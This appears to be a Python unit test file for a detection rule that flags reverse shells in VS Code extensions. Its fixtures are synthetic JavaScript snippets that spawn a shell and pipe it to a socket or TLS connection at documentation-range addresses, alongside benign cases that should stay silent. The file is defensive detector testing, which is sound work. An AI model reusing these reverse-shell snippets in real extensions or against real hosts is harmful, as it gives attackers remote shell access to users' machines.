"""Fire / silent / FP-guard unit tests for the S10 reverse-shell rule.

Inputs are SYNTHETIC — they reproduce the securezeron PoC's *shape* (platform-
selected shell -> child_process spawn -> socket -> bidirectional stdio pipe) with
a documentation-range C2 literal (RFC 5737 ``203.0.113.0/24``), never the real
sample. No live malware enters the repo (see the detection-design README safety
section).
"""

from __future__ import annotations

from collections.abc import Callable

from static_runtime.context import StaticAnalysisContext
from static_runtime.rules.s10_reverse_shell import ReverseShellRule

MakeContext = Callable[..., StaticAnalysisContext]

# The securezeron reverse-shell shape, declawed: synthetic C2 literal, no real
# host. Shell name and spawn call sit on different lines (the platform-selected-
# shell idiom) to prove the rule does not need them on the same expression.
_REVERSE_SHELL = """
const cp = require("child_process");
const net = require("net");
function activate() {
  const shell = process.platform === "win32" ? "cmd.exe" : "sh";
  const proc = cp.exec(shell);
  const socket = new net.Socket();
  socket.connect(4444, "203.0.113.10", function () {
    socket.pipe(proc.stdin);
    proc.stdout.pipe(socket);
    proc.stderr.pipe(socket);
  });
}
exports.activate = activate;
"""


def test_fires_critical_on_reverse_shell_wiring(make_context: MakeContext) -> None:
    ctx = make_context(files={"extension.js": _REVERSE_SHELL})
    findings = ReverseShellRule().evaluate(ctx)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule_id == "extrace.s10.reverse_shell"
    assert finding.severity.value == "critical"
    assert finding.confidence.value == "high"
    assert "attack.T1059" in finding.categories
    assert "extrace.ext.reverse_shell" in finding.categories
    assert finding.evidence  # at least the pipe-wiring line is cited


def test_fires_on_nf3xn_bin_sh_connectback(make_context: MakeContext) -> None:
    # nf3xn regression: the yo-code "Hello World" template with a /bin/sh
    # connect-back reverse shell. Distinct from securezeron only in low-intensity
    # deltas (onCommand activation, ms-vscode publisher spoof) that do NOT change
    # the RS1 conjunction — s10 still convicts. Synthetic, documentation-range C2.
    src = """
    const cp = require("child_process");
    const net = require("net");
    function helloWorld() {
      const sh = cp.spawn("/bin/sh", []);
      const sock = net.connect(4444, "203.0.113.10", () => {
        sock.pipe(sh.stdin);
        sh.stdout.pipe(sock);
        sh.stderr.pipe(sock);
      });
    }
    exports.activate = (ctx) => ctx.subscriptions.push(helloWorld);
    """
    ctx = make_context(files={"extension.js": src})
    findings = ReverseShellRule().evaluate(ctx)
    assert len(findings) == 1
    assert findings[0].severity.value == "critical"


def test_fires_on_manual_stdin_write_bridge(make_context: MakeContext) -> None:
    # nf3xn spec §4a: the reverse-shell variant that bridges socket<->shell with a
    # manual `socket.on("data", d => proc.stdin.write(d))` instead of `.pipe()`.
    # The stdin.write wiring conjunct must catch it within the full conjunction.
    src = """
    const { spawn } = require("child_process");
    const net = require("net");
    const sh = spawn("/bin/bash", []);
    const sock = net.connect(9001, "203.0.113.30");
    sock.on("data", (d) => sh.stdin.write(d));
    sh.stdout.on("data", (d) => sock.write(d));
    """
    ctx = make_context(files={"ext.js": src})
    assert len(ReverseShellRule().evaluate(ctx)) == 1


def test_fires_on_tls_socket_variant(make_context: MakeContext) -> None:
    # Encrypted-channel evasion: tls.connect instead of net.Socket still trips
    # the socket conjunct, so the conjunction holds.
    src = """
    const { spawn } = require("child_process");
    const tls = require("tls");
    const sh = spawn("/bin/bash");
    const c = tls.connect(8443, "203.0.113.20", () => {
      c.pipe(sh.stdin);
      sh.stdout.pipe(c);
    });
    """
    ctx = make_context(files={"ext.js": src})
    assert len(ReverseShellRule().evaluate(ctx)) == 1


def test_silent_for_child_process_only(make_context: MakeContext) -> None:
    # A build/lint extension shells out — no socket, no pipe wiring.
    ctx = make_context(
        files={"extension.js": 'require("child_process").exec("sh ./build.sh");'}
    )
    assert ReverseShellRule().evaluate(ctx) == []


def test_silent_for_socket_only(make_context: MakeContext) -> None:
    # A telemetry / update-check extension opens a socket — no shell, no pipe.
    ctx = make_context(
        files={
            "extension.js": (
                'const net = require("net");\n'
                'new net.Socket().connect(443, "telemetry.example.com");'
            )
        }
    )
    assert ReverseShellRule().evaluate(ctx) == []


def test_silent_for_shell_and_socket_without_pipe(make_context: MakeContext) -> None:
    # The load-bearing FP guard: an extension that BOTH shells out AND has a
    # network socket, but never wires the shell stdio to the socket, is not a
    # reverse shell. Without the .pipe() conjunct the rule stays silent.
    src = """
    const cp = require("child_process");
    const net = require("net");
    cp.exec("sh -c 'git status'");
    const s = new net.Socket();
    s.connect(443, "telemetry.example.com");
    """
    ctx = make_context(files={"extension.js": src})
    assert ReverseShellRule().evaluate(ctx) == []


def test_silent_for_legit_stream_pipe(make_context: MakeContext) -> None:
    # A plain stream copy uses .pipe() but has no shell process — not a match.
    src = """
    const fs = require("fs");
    fs.createReadStream("a.txt").pipe(fs.createWriteStream("b.txt"));
    """
    ctx = make_context(files={"extension.js": src})
    assert ReverseShellRule().evaluate(ctx) == []
